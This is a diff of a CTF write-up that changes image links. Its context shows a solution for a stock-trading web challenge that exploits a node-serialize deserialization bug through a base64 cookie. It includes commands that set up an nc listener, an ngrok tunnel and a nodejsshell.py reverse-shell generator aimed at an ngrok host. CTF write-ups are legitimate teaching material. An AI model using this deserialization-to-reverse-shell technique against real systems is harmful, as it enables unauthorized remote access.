@@ -4,21 +4,21 @@ layout: post
 competition: hilltopctf2020
 ---
 ## Description
-![efa64bd1b328af15756e58713896f9e2.png](../../_resources/f4b0192cb9434642a073400b28e965b5.png)
+![efa64bd1b328af15756e58713896f9e2.png](/assets/images/f4b0192cb9434642a073400b28e965b5.png)
 
 ## Solving
 Given a website that seems like a plain stock trading website.
-![74801145c620d176fc339b8682b79e13.png](../../_resources/fdd2d617235c48abaa03cd58c34f4652.png)
+![74801145c620d176fc339b8682b79e13.png](/assets/images/fdd2d617235c48abaa03cd58c34f4652.png)
 
 Examining the response header of the web would give us a hint about:
 1. The web application is based on Express.js.
 2. The server gave us cookies named `myself` with some gibberish string as the value
 
-![4cf7848fd6f6ba78099697a0d7a5d0ef.png](../../_resources/4e864b8c7d9246788f130f282f0008b7.png)
+![4cf7848fd6f6ba78099697a0d7a5d0ef.png](/assets/images/4e864b8c7d9246788f130f282f0008b7.png)
 
 The gibberish string in the cookie is not gibberish at all actually, it is a base64-encoded string. Here's the decoded value:
 
-![399934d9664cc1321461af149cfee0c9.png](../../_resources/9f3e0a0982064b22b052b52b72028972.png)
+![399934d9664cc1321461af149cfee0c9.png](/assets/images/9f3e0a0982064b22b052b52b72028972.png)
 
 ```
 {
@@ -40,11 +40,11 @@ The gibberish string in the cookie is not gibberish at all actually, it is a bas
 Furthermore, simple enumeration of the website reveals a `robots.txt` file, which then discloses the other two interesting files: `package.json` and `package-lock.json`.
 
 
-![d3a2feb27205f861b633a7fbb70e874a.png](../../_resources/52d81061cbcd4c7aac66fa3bea9029b3.png)
+![d3a2feb27205f861b633a7fbb70e874a.png](/assets/images/52d81061cbcd4c7aac66fa3bea9029b3.png)
 
 Visiting `http://192.81.210.234:10004/package.json` gives us information about the website's library dependencies. Among those dependencies, we can see that the website used `node-serialize` library, which is known to have a deserialization bug that leads to a *remote code execution* or RCE (read [here](https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf)).
 
-![163d221b3293caf754e8ee50860832d1.png](../../_resources/4cc86792aaae4bfd9305034068fda7fb.png)
+![163d221b3293caf754e8ee50860832d1.png](/assets/images/4cc86792aaae4bfd9305034068fda7fb.png)
 
 The vulnerability can be exploited when untrusted input is
 passed into `unserialize()` function. In this case, our untrusted input is in the `myself` cookie.  So the major goal is to exploit the vulnerability to spawn a reverse shell, or at least to perform an RCE.
@@ -62,7 +62,7 @@ First, start `nc` in our local machine.
 nc -nvlp 1337
 ```
 
-![c386684c02fd61c67c475a6c9a7e0762.png](../../_resources/c01fef3d2ff04d11b30cf90aee62f311.png)
+![c386684c02fd61c67c475a6c9a7e0762.png](/assets/images/c01fef3d2ff04d11b30cf90aee62f311.png)
 
 
 Then, start `ngrok` that points to `localhost:1337`, still in our local machine.
@@ -70,7 +70,7 @@ Then, start `ngrok` that points to `localhost:1337`, still in our local machine.
 ngrok tcp 1337
 ```
 
-![3f6e496ddd4e71bc12b64117f45199cd.png](../../_resources/26cdc2e6f241403daa55dbe9a88dd5f5.png)
+![3f6e496ddd4e71bc12b64117f45199cd.png](/assets/images/26cdc2e6f241403daa55dbe9a88dd5f5.png)
 
 
 After that, run the `nodejsshell.py` and supply the argument with Ngrok domain and port (without HTTP).
@@ -79,7 +79,7 @@ After that, run the `nodejsshell.py` and supply the argument with Ngrok domain a
 python nodejsshell.py 0.tcp.ngrok.io 13159
 ```
 
-![244e755993bb392ebcf88515766baa83.png](../../_resources/994c167551bf49fbbd4edc239c9e1b26.png)
+![244e755993bb392ebcf88515766baa83.png](/assets/images/994c167551bf49fbbd4edc239c9e1b26.png)
 
 
 And that's the payload, here:
@@ -144,17 +144,17 @@ ewogICAgImlkIjogImU3YjJmY2Y4LTgyYTEtNDcxOC1iMzIzLTdlMzZhNmM0YWYwYyIsCiAgICAicmNl
 
 Then we modified the cookie and perform a Buy/Sell action on the website (since we need to interact with the website for them to read and `unserialize` our cookie).
 
-![308e2e156176bf87a74dee923822befd.png](../../_resources/b89e632607964a649735a077e173f1d4.png)
+![308e2e156176bf87a74dee923822befd.png](/assets/images/b89e632607964a649735a077e173f1d4.png)
 
 Our `nc` should then receive a connection from the server, and we got a reverse shell.
 
 
-![26b70b7c1a719e30a5430a0f16612995.png](../../_resources/eefc83191aab4856b4a56cc4fb735dc4.png)
+![26b70b7c1a719e30a5430a0f16612995.png](/assets/images/eefc83191aab4856b4a56cc4fb735dc4.png)
 
 
 The flag can be found in `/flag.txt`.
 
-![71eaec9750f48a9c14cea122c1eff968.png](../../_resources/f48706a1b1d3463ea747c9cc1320e2f5.png)
+![71eaec9750f48a9c14cea122c1eff968.png](/assets/images/f48706a1b1d3463ea747c9cc1320e2f5.png)
 
 
 ## The Flag
